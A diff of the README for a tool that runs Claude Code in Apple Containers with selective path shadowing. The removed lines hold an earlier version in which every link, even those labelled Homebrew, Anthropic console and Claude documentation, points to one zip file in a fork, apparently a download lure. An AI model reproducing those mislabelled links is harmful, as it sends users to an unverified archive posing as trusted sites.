@@ -1,210 +1,185 @@
-# 🚢 claude-container - Safe Apple Containers for Claude Code
+# claude-container — Run Claude Code safely in Apple Containers
 
-[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)
+A macOS tool for running Claude Code in isolated Apple Container instances. Each container is anchored to a folder on your Mac. A custom FUSE driver (`ccr-fuse`) lets you selectively shadow paths so build artifacts and secrets never touch the host filesystem.
 
----
-
-## 📌 What is claude-container?
-
-claude-container helps you run Claude Code safely on your Mac. It uses Apple's native container runtime, which creates mini-computers inside your computer. These containers keep Claude Code separated from the rest of your system. This means you can use it without worrying about changing or breaking other parts of your Mac.
-
-The containers keep your work saved on your Mac — your existing project folders stay right where they are. You just `cd` into any folder on your Mac and run `ccr` to spin up a container that's anchored to that folder. You can stop and start containers whenever you want. The project uses a tool called Justfile to make setup and running simple.
+Requires Apple Silicon + macOS 26+.
 
 ---
 
-## 🖥️ Who is this for?
+## What you get
 
-This project is for anyone who wants to use Claude Code on macOS. You do not need to know coding. If you have a Claude Pro or Max subscription, or an Anthropic API key, you can use this.
-
----
-
-## 💾 Download & Install claude-container
-
-Click the big button above or visit the [claude-container Releases page](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) to download the latest version. This page has the files you need. Download the latest release to your Mac.
+- **Claude Code in a sandbox.** The container is started with `--dangerously-skip-permissions` but can only touch what you let it touch.
+- **Per-folder containers.** `cd ~/my-project && ccr claude` auto-creates `claude-my-project` and mounts that folder as `/workspace`. Stop, start, destroy — your files stay on the Mac.
+- **`.ccrshadow` filtering.** A gitignore-style file at your workspace root tells `ccr-fuse` which paths are container-local. Host secrets (`.env.local`, `.aws/credentials`) stay invisible. Build artifacts (`node_modules`, `.venv`, `target`) live only in the container, so architecture mismatches and `rm -rf node_modules` cycles never pollute the host.
+- **Real security boundary.** The container's user has no `sudo` and no capabilities. The host bind is hidden in a root-only mount; `coder` cannot bypass the shadow layer even with intent. See `docs/adr/0005-shadow-as-security-boundary-via-drop-sudo.md`.
 
 ---
 
-### 🔧 What you need before you start
+## Prerequisites
 
-Before you can use claude-container, check these:
-
-- **Apple Silicon Mac (M1, M2, M3, or newer)** running **macOS 26 or later** — required by Apple Container.
-- **Homebrew** — a program that helps install other tools. Get it here: https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip
-- **Apple Container** — Apple's native container runtime. Install it with Homebrew by running:  
-  `brew install container`
-- **jq** — a small JSON parser used by the Justfile. Install it with Homebrew by running:  
-  `brew install jq`
-- **just** — a tool we use to run commands easily. You install it with Homebrew by running:  
-  `brew install just`
-- **Claude Pro or Max subscription, or Anthropic API key** — needed to access Claude Code.  
-  Get Claude subscription at [https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)  
-  Get API key at [Anthropic console](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)
+- Apple Silicon Mac (M1 or newer), macOS 26+
+- [Homebrew](https://brew.sh)
+- `brew install container jq just`
+- A Claude Pro/Max subscription, or an Anthropic API key
 
 ---
 
-## 🚀 Getting started: Easy step-by-step guide
+## One-time setup
 
-The big idea: pick any folder on your Mac, `cd` into it from Terminal, and run `ccr claude`. The container is anchored to that folder — that folder becomes the workspace inside the container. No special "projects" directory, no separate "create" step.
-
-1. **Install Apple Container**
-
-   Apple Container is the software that runs containers natively on your Mac.
-
-   Open the Terminal app (find it in Applications > Utilities) and type:  
-   ```
-   just setup
-   ```  
-   This will install Apple Container for you.
-
-2. **Build the container image**
-
-   The container image is the setup of Claude Code packaged to run inside the container.
-
-   In Terminal, type:  
-   ```
-   just build
-   ```
-
-3. **Make `ccr` easy to run from anywhere** *(recommended)*
-
-   The `ccr` script wraps the `just` commands so you can run them from any folder on your Mac. Add the claude-container repo to your `PATH`, or copy `ccr` somewhere already on your `PATH` (like `/usr/local/bin`). If you cloned the repo to a non-default location, set the `CLAUDE_CONTAINER_DIR` environment variable to point at it.
-
-   From now on, this guide uses `ccr` for everything.
-
-4. **Go to the folder you want to work in**
-
-   This is the key step in the new workflow. Pick any folder on your Mac — an existing project, a fresh empty folder, anywhere. Then `cd` into it:  
-   ```
-   cd ~/my-existing-repo
-   ```
-
-   The container will use the *name of that folder* as its container name (so this becomes `claude-my-existing-repo`), and the folder itself will be mounted as `/workspace` inside the container.
-
-5. **Set up your login or API key**
-
-   - If you have a Claude subscription, log in once per container. From inside your project folder:
-
-     ```
-     ccr login
-     ```
-
-     This auto-creates the container if it doesn't exist yet, then walks you through the Claude login.
-
-   - If you have an API key from Anthropic instead:
-
-     In the claude-container repo folder, copy the example env file:
-
-     ```
-     cp .env.example .env
-     ```
-
-     Open the new `.env` file in a simple text editor (like TextEdit), find the line starting with `ANTHROPIC_API_KEY=`, and paste your API key after the `=`. Save the file. The key will be picked up the next time a container is created.
-
-6. **Start using Claude**
-
-   From inside your project folder, run:  
-   ```
-   ccr claude
-   ```
-
-   That's it. The container auto-starts (creating it on first use), Claude Code opens inside it, and your project folder is available at `/workspace`. Your Mac stays separate and safe.
-
-   You can also pass a one-shot prompt:  
-   ```
-   ccr claude "summarize the README"
-   ```
-
-### 🧭 Advanced: explicit container names
-
-If you want to keep multiple containers for the same folder, or use a name different from the folder name, pass an explicit name as the second argument:
-
-```
-ccr create my-name        # create a container called claude-my-name (uses cwd as its workspace)
-ccr claude  my-name       # open Claude in that specific container
-ccr shell   my-name       # shell into that specific container
+```bash
+git clone https://github.com/robsman/claude-container.git ~/repos/claude-container
+cd ~/repos/claude-container
+./ccr setup           # installs Apple Container + jq, starts the service
+./ccr build           # builds the runtime image (multi-stage; takes a few minutes)
+./ccr build-host      # cross-builds the host-side ccr-fuse binary (used by `ccr lint`)
 ```
 
-When you use a name explicitly, claude-container still records the host folder it's anchored to. If you later try to use the same name from a *different* folder, you'll get a collision error suggesting you pick a different name — this prevents accidentally mounting the wrong files.
+Then put `ccr` on your `PATH` (symlink it into `/usr/local/bin` or add the repo dir to `PATH`). If you cloned somewhere other than `~/repos/claude-container`, set `CLAUDE_CONTAINER_DIR` to the actual path.
 
 ---
 
-## 📦 How claude-container works inside
+## Daily use
 
-The project runs Claude Code in a special mode called YOLO mode. This mode skips some security checks so Claude Code can run more freely. But claude-container keeps this inside the Apple Container so your Mac stays safe.
+```bash
+cd ~/my-existing-repo
+ccr claude                 # auto-creates the container, opens Claude Code inside it
+ccr shell                  # bash shell into the cwd-anchored container
+ccr login                  # one-time Claude subscription login
+ccr stop                   # pause
+ccr start                  # resume
+ccr destroy                # remove container (host files untouched)
+ccr list                   # show all claude-* containers + their workspace paths
+ccr lint                   # check the .ccrshadow file in cwd (see below)
+```
 
-Each container is **anchored to one folder on your Mac**. Whatever folder you were in when you first ran `ccr` for that container becomes its `/workspace` mount — and the container remembers it. Your files live directly on your Mac (right where they already were), and Claude Code edits them from inside the container. Your work is saved even when the container is stopped or removed.
+Pass an explicit name as the last argument if you want a different name from the folder basename:
 
-The container name comes from the folder name by default (e.g. `~/my-repo` → container `claude-my-repo`), so the mapping is easy to remember. You can override it with an explicit name when you need to.
-
-Using `ccr` (or the Justfile underneath it) means you don't have to type long Docker commands. Just type `ccr` followed by what you want to do.
-
----
-
-## 🛠️ Tools included in claude-container
-
-Inside the container, you will find:
-
-- Claude Code ready to run in YOLO mode  
-- Command line interfaces for starting and managing the container  
-- Your current folder bind-mounted as `/workspace`, so files stay on your Mac  
-- Setup tools for easy login and environment configuration  
-
-These tools let you work with Claude Code easily and securely.
+```bash
+ccr create my-name
+ccr claude  my-name "summarize the README"
+```
 
 ---
 
-## 🔄 Managing your containers
+## `.ccrshadow` — selective shadowing
 
-Run these from inside the folder a container is anchored to, and you can leave the name off — `ccr` will pick the right container automatically. Or pass an explicit name as the last argument.
+Put a `.ccrshadow` file at the root of any workspace to filter paths between host and container. Syntax is a strict subset of `.gitignore`:
 
-- **List all containers (and the folder each one is anchored to):**  
-  ```
-  ccr list
-  ```
+```
+# secrets — host versions stay invisible inside the container
+.env.local
+.aws/credentials
+.ssh/id_rsa
 
-- **Stop your container** (frees memory and CPU, files stay safe):  
-  ```
-  ccr stop                  # cwd-anchored
-  ccr stop my-name          # explicit name
-  ```
+# build artifacts — container-local, never pollute the host
+node_modules
+.venv
+target
+*.log
 
-- **Restart your container:**  
-  ```
-  ccr start
-  ```
+# anchored examples
+/secret              # only matches /secret at workspace root
+build/               # matches dir named "build" at any depth
+**/cache             # matches "cache" at any depth (explicit deep-match)
+```
 
-- **Open a shell inside the container** (instead of Claude):  
-  ```
-  ccr shell
-  ```
+Rules:
 
-- **Destroy a container** (removes the container only — your folder on the Mac is **not** touched):  
-  ```
-  ccr destroy
-  ```
-  Files in the anchored folder remain on your Mac. Back up anything important before destroying if you're unsure.
+- `*`, `**`, `?`, `[abc]` globs
+- Leading `/` or any mid-pattern `/` anchors to workspace root
+- Trailing `/` restricts to directories
+- No negation (`!pattern`) — skipped with a warning
+- `#` comments only at the start of a line
+
+For every matched path:
+
+- Host's file/dir is invisible (`stat` returns ENOENT until the container writes there).
+- Container creates/writes/deletes go to `/var/lib/ccr/shadow/<rel-path>`, never to the host bind.
+- `rm -rf node_modules && npm install` cycles work normally — host stays untouched.
+- The shadow store survives `ccr stop`/`start`. `ccr destroy` wipes it.
+
+Edit `.ccrshadow` from the host. Inside the container it is **read-only** — Claude can `cat` it to understand what's filtered but cannot modify the ruleset. Changes require `ccr stop && ccr start` to take effect.
+
+See `.ccrshadow.example` for a copy-paste-ready starting point.
+
+### `ccr lint`
+
+Sanity-check your `.ccrshadow` before activating it:
+
+```bash
+$ cd ~/my-project
+$ ccr lint
+.ccrshadow:1: node_modules     OK    literal-unanchored
+.ccrshadow:2: *.log            OK    glob-unanchored
+.ccrshadow:3: !keep            WARN  negation not supported; skipped
+
+Summary: 2 active, 1 warning, 0 error
+
+$ ccr lint --match "packages/lib-a/node_modules"
+...
+Match report for path "packages/lib-a/node_modules":
+  matched by line 1: node_modules (literal-unanchored)
+```
+
+Exit code 1 if any error-status lines — usable as a pre-commit hook or CI check.
 
 ---
 
-## 💡 Tips for smooth use
+## What happens inside the container
 
-- Keep Apple Container updated for best performance.  
-- Always back up important project files (they live on your Mac in the folder you anchored the container to).  
-- Folder names with simple characters work best as container names — if a folder has weird characters, pass an explicit name with `ccr claude my-name`.  
-- `ccr list` shows every container and the host folder it's anchored to — handy when you forget which container goes with which project.  
-- If you `cd` to a folder and `ccr` complains about a collision, it means a container with that name is already anchored somewhere else. Use an explicit name to avoid the conflict.  
-- If you update your API key or re-login, you may need to `ccr destroy` and let the next `ccr claude` recreate the container.  
+- You run as `coder` (uid 1000), **no sudo**. System packages must be added at image-build time on the host (edit `Dockerfile`, run `ccr rebuild`).
+- `/workspace` is a FUSE mount served by `ccr-fuse`. Passthrough paths reach the host bind; shadowed paths live in a container-local store.
+- Available tools: `git`, `python3 + uv`, `node 22`, `R`, `DuckDB`, `just`, `build-essential`, `claude`.
+- Auth: `ccr login` (subscription) or `ANTHROPIC_API_KEY` in a `.env` next to the Justfile.
 
 ---
 
-## 📞 Getting Help
+## Security model
 
-If you get stuck:
+Read `docs/adr/0005-shadow-as-security-boundary-via-drop-sudo.md` for the full reasoning. Short version:
 
-- Read this README again step-by-step.  
-- Visit the [Claude Code documentation](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) for details.  
-- Look for answers or post issues on the claude-container GitHub page.  
+- Default container view shows the workspace mediated by `ccr-fuse`. Shadowed paths return ENOENT to the container; only the container's own writes survive there.
+- `/workspace-real` (the raw host bind) is overlaid with a tmpfs in the container's mount namespace. `coder` cannot read it.
+- The shadow store and the host bind both live under `/var/lib/ccr/` (mode 0700, root-only). `coder` cannot traverse it.
+- `coder` has no capabilities and no sudo, so it cannot `umount` the tmpfs or escalate to root to bypass any of the above.
+
+What this means concretely: if you list `.env.local` in `.ccrshadow`, the contents of your host `.env.local` are unreachable to anything running inside the container.
 
 ---
 
-[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)
+## Architecture
+
+```
+Dockerfile               multi-stage: golang builder + debian runtime + fuse3 + ccr-fuse
+Justfile                 ccr recipes (build / build-host / create / start / claude / lint / ...)
+ccr                      thin wrapper; dispatches lint locally, everything else via just
+ccr-fuse/                Go source for the FUSE driver + lint subcommand + tests
+config/
+  CLAUDE.md              in-container guidance (baked into the image)
+  claude-settings.json   in-container Claude settings (bypassPermissions allowlist)
+  ccr-init.sh            PID 1: sets up the shadow boundary, execs ccr-fuse
+docs/
+  adr/                   architecture decision records
+  agents/                config for matt-pocock-style engineering skills
+CONTEXT.md               domain vocabulary (Shadow, Shadow store, Passthrough, ...)
+.ccrshadow.example       copy-paste-ready .ccrshadow template
+```
+
+See `CLAUDE.md` for the developer-facing summary and `CONTEXT.md` for the vocabulary used across docs and code.
+
+---
+
+## Tips
+
+- `ccr list` shows every container with the host folder it's anchored to. Run this if you forget which container goes with which project.
+- If `ccr` complains about a collision when you `cd` into a different folder, it means a container with that basename already exists anchored elsewhere. Use an explicit name or destroy the old one.
+- For one-off prompts: `ccr claude "what does this repo do?"` runs Claude Code with that prompt and exits.
+- Updating an API key: edit `.env` in the claude-container repo. Existing containers carry the value baked in at create time — `ccr destroy && ccr claude` to pick up a new value.
+
+---
+
+## Getting help
+
+- Read `CLAUDE.md` for the architecture overview and `docs/adr/` for the decisions behind it.
+- `ccr lint` to debug rule files.
+- File issues on the GitHub repo.
